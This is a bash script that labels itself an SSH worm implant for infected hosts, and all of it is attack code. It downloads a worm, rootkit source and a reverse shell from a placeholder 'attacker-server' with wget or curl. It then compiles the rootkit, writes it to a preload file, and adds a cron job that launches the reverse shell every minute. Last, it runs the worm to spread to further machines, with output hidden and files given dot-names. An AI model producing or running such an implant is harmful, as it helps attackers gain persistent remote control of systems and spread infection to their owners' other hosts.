#!/bin/bash
# SSH Worm Implant Script
# This script is executed on infected hosts to continue the worm propagation

# Exit immediately if a command exits with a non-zero status
set -e

# Configuration
WORM_URL="http://attacker-server/sshade.py"  # URL to download the worm from
WORM_PATH="/tmp/sshade.py"
ROOTKIT_URL="http://attacker-server/rootkit.c"  # URL to download the rootkit from
ROOTKIT_PATH="/tmp/.rootkit.c"
REVERSE_SHELL_URL="http://attacker-server/reverse_shell.sh"  # URL to download the reverse shell
REVERSE_SHELL_PATH="/tmp/.reverse_shell"

# Download the worm
echo "[*] Downloading worm..."
wget -O "$WORM_PATH" "$WORM_URL" 2>/dev/null || curl -o "$WORM_PATH" "$WORM_URL" 2>/dev/null

# Make the worm executable
chmod +x "$WORM_PATH"

# Download the rootkit
echo "[*] Downloading rootkit..."
wget -O "$ROOTKIT_PATH" "$ROOTKIT_URL" 2>/dev/null || curl -o "$ROOTKIT_PATH" "$ROOTKIT_URL" 2>/dev/null

# Download the reverse shell
echo "[*] Downloading reverse shell..."
wget -O "$REVERSE_SHELL_PATH" "$REVERSE_SHELL_URL" 2>/dev/null || curl -o "$REVERSE_SHELL_PATH" "$REVERSE_SHELL_URL" 2>/dev/null

# Make the reverse shell executable
chmod +x "$REVERSE_SHELL_PATH"

# Install the rootkit
echo "[*] Installing rootkit..."
# Compile the rootkit
gcc -fPIC -shared -o /tmp/.rk.so "$ROOTKIT_PATH" -ldl 2>/dev/null || echo "[!] Failed to compile rootkit"

# Make the rootkit executable
chmod +x /tmp/.rk.so 2>/dev/null || echo "[!] Failed to make rootkit executable"

# Add to LD_PRELOAD
echo /tmp/.rk.so > /tmp/.ld.so.preload 2>/dev/null || echo "[!] Failed to add rootkit to LD_PRELOAD"

# Add persistence through cron
echo "* * * * * $REVERSE_SHELL_PATH" | crontab - 2>/dev/null || echo "[!] Failed to add persistence"

# Run the worm
echo "[*] Executing worm..."
python3 "$WORM_PATH" --worm 2>/dev/null || echo "[!] Failed to execute worm"

# Clean up
echo "[*] Implant execution completed"
